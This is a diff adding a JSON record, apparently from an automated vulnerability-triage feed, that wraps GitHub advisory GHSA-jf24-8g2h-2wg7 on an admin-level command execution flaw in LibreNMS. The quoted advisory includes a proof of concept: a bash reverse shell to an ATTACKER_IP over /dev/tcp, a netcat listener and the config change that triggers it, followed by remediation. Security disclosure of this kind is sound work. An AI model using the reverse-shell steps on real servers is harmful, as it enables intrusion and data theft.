@@ -1,0 +1,56 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/119403549?v=4\", \"events_url\": \"https://api.github.com/users/tCu0n9/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/tCu0n9/followers\", \"following_url\": \"https://api.github.com/users/tCu0n9/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/tCu0n9/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/tCu0n9\", \"id\": 119403549, \"login\": \"tCu0n9\", \"node_id\": \"U_kgDOBx30HQ\", \"organizations_url\": \"https://api.github.com/users/tCu0n9/orgs\", \"received_events_url\": \"https://api.github.com/users/tCu0n9/received_events\", \"repos_url\": \"https://api.github.com/users/tCu0n9/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/tCu0n9/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/tCu0n9/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/tCu0n9\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 6.4, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H\"}}, \"cwes\": [{\"cwe_id\": \"CWE-77\", \"name\": \"Improper Neutralization of Special Elements used in a Command ('Command Injection')\"}, {\"cwe_id\": \"CWE-78\", \"name\": \"Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"}], \"description\": \"# Remote Code Execution via AboutController in LibreNMS\\n\\n## Summary\\n\\nA Remote Code Execution (RCE) vulnerability exists in LibreNMS 26.3.1 through the AboutController. An authenticated administrator can manipulate the `snmpget` configuration parameter to execute arbitrary system commands. When the `/about` endpoint is accessed, the application executes the configured binary path via `shell_exec()` without proper validation. This vulnerability leads to complete server compromise, allowing attackers to establish reverse shells, exfiltrate sensitive data, and maintain persistent access.\\n\\n**Severity:** High (CVSS 7.2)\\n**Attack Vector:** Network\\n**Privileges Required:** High (Administrator)\\n**User Interaction:** None\\n**Impact:** Complete system compromise with web server privileges\\n\\n---\\n\\n## Details\\n\\n### Vulnerable Code\\n\\n**File:** `app/Http/Controllers/AboutController.php`\\n**Line:** 85\\n\\n```php\\n'version_netsnmp' => str_replace('version: ', '', \\n    rtrim(shell_exec(LibrenmsConfig::get('snmpget', 'snmpget') . ' -V 2>&1'))),\\n```\\n\\n### Root Cause\\n\\nThe AboutController retrieves the `snmpget` configuration value from the database and directly concatenates it into a `shell_exec()` call without proper validation or escaping. While the `sanitizePath()` function attempts to validate executable paths by blocking special characters (`;`, `` ` ``, `#`, `$`, `|`, `&`, `'`, `\\\"`, `>`, `<`, `(`), it only prevents direct command injection. It does NOT prevent an attacker from pointing the configuration to a malicious executable file already present on the system.\\n\\n### Configuration Access\\n\\nThe `snmpget` configuration can be modified through the web interface:\\n\\n- **Endpoint:** `PUT /settings/snmpget`\\n- **Controller:** `SettingsController::update()`\\n- **Required Privileges:** Administrator\\n- **Config Definition:** `resources/definitions/config_definitions.json`\\n\\n```json\\n\\\"snmpget\\\": {\\n    \\\"default\\\": \\\"/usr/bin/snmpget\\\",\\n    \\\"type\\\": \\\"executable\\\"\\n}\\n```\\n\\n### Validation Analysis\\n\\nThe `sanitizePath()` function in `DynamicConfigItem.php`:\\n\\n```php\\n// LibreNMS/Util/DynamicConfigItem.php:277-284\\nprivate function sanitizePath(string $path): string|false\\n{\\n    if (preg_match('/[`;#$|&\\\\'\\\"><(]/', $path)) {\\n        return false;\\n    }\\n    return realpath($path);\\n}\\n\\n// LibreNMS/Util/DynamicConfigItem.php:107-110\\n} elseif ($this->type === 'executable') {\\n    $value == $this->sanitizePath($value);\\n    return $value !== false && is_file($value) && is_executable($value);\\n}\\n```\\n### Attack Scenarios\\n\\n| Scenario | Description |\\n|----------|-------------|\\n| **Insider Threat** | Internal admin creates malicious file → updates config → RCE |\\n| **Privilege Escalation** | Attacker with limited access → creates file → full RCE |\\n| **Supply Chain** | Malicious package installs binary → admin uses it → RCE |\\n\\n---\\n\\n## PoC\\n\\n### Prerequisites\\n\\n- Valid administrator credentials for LibreNMS web interface\\n- Ability to create a file on the target system (via prior access, SSH, or another vulnerability)\\n\\n### Proof of Concept - Reverse Shell\\n\\n#### Step 1: Create Malicious Executable\\n\\nCreate a reverse shell payload that connects back to the attacker:\\n\\n```bash\\nATTACKER_IP=\\\"172.16.69.144\\\"\\nATTACKER_PORT=9001\\n\\nbash -c 'bash -i >& /dev/tcp/'$ATTACKER_IP'/'$ATTACKER_PORT' 0>&1' 2>/dev/null\\n```\\n\\nSave this as `/tmp/rev_shell.sh` and make it executable:\\n```bash\\nchmod +x /tmp/rev_shell.sh\\n```\\n\\n#### Step 2: Setup Netcat Listener\\n\\nOn your attacking machine, start a netcat listener:\\n\\n```bash\\nnc -lvnp 9001\\n```\\n\\n#### Step 3: Update Configuration via Web Interface\\n\\nLogin to LibreNMS web interface as administrator and navigate to:\\n- **Settings** → **External** → **Binaries**\\n- Locate **snmpget** configuration\\n- Update the value to: `/tmp/rev_shell.sh`\\n- Click **Save**\\n\\n<img width=\\\"1919\\\" height=\\\"848\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/f4f78425-396e-4dc3-a11f-a33f0f6f7fa3\\\" />\\n\\n#### Step 4: Trigger RCE\\n\\nAccess the `/about` endpoint to execute the malicious binary:\\n\\n<img width=\\\"1861\\\" height=\\\"957\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/4d3da8b9-1ec4-4703-bede-9e485e45726b\\\" />\\n\\n---\\n\\n## Impact Summary\\n\\n| Category | Level | Description |\\n|----------|-------|-------------|\\n| **Confidentiality** | HIGH | Read config files, database credentials, SSH keys |\\n| **Integrity** | HIGH | Create webshells, backdoors, modify code |\\n| **Availability** | HIGH | Disrupt services, delete data, stop monitoring |\\n| **Scope** | CHANGED | Compromise extends beyond application to system |\\n\\n### Who Is Impacted\\n- LibreNMS installations where attacker has admin credentials AND file system access\\n- Organizations using LibreNMS for network monitoring\\n- Systems monitored by LibreNMS (lateral movement risk)\\n\\n\\n---\\n\\n## Remediation\\n\\nReplace `shell_exec()` with Symfony Process component:\\n\\n```php\\n// BEFORE (vulnerable):\\nshell_exec(LibrenmsConfig::get('snmpget', 'snmpget') . ' -V 2>&1')\\n\\n// AFTER (safe):\\n$process = new Process([LibrenmsConfig::get('snmpget', 'snmpget'), '-V']);\\n$process->run();\\n```\", \"ghsa_id\": \"GHSA-jf24-8g2h-2wg7\", \"github_reviewed_at\": \"2026-08-18T21:17:11Z\", \"html_url\": \"https://github.com/advisories/GHSA-jf24-8g2h-2wg7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-jf24-8g2h-2wg7\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-18T21:17:11Z\", \"references\": [\"https://github.com/librenms/librenms/security/advisories/GHSA-jf24-8g2h-2wg7\", \"https://github.com/librenms/librenms/releases/tag/26.5.0\", \"https://github.com/advisories/GHSA-jf24-8g2h-2wg7\"], \"repository_advisory_url\": \"https://api.github.com/repos/librenms/librenms/security-advisories/GHSA-jf24-8g2h-2wg7\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/librenms/librenms\", \"summary\": \"LibreNMS Vulnerable to Remote Code Execution via AboutController\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-18T21:17:12Z\", \"url\": \"https://api.github.com/advisories/GHSA-jf24-8g2h-2wg7\", \"vulnerabilities\": [{\"first_patched_version\": \"26.5.0\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"librenms/librenms\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 26.5.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-jf24-8g2h-2wg7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "librenms/librenms: < 26.5.0"
+    ],
+    "authentication_required": true,
+    "cves": [],
+    "cvss_score": 6.4,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "librenms/librenms"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-08-19T19:20:52.999276Z",
+  "provenance": {
+    "content_sha256": "60f1ff3c347758cee72992a017cb2bf3618d6913c202be467cb33aaa4d92b143",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-18T21:17:11Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-jf24-8g2h-2wg7",
+  "status": "active",
+  "title": "LibreNMS Vulnerable to Remote Code Execution via AboutController",
+  "updated_at": "2026-08-18T21:17:12Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-jf24-8g2h-2wg7"
+}
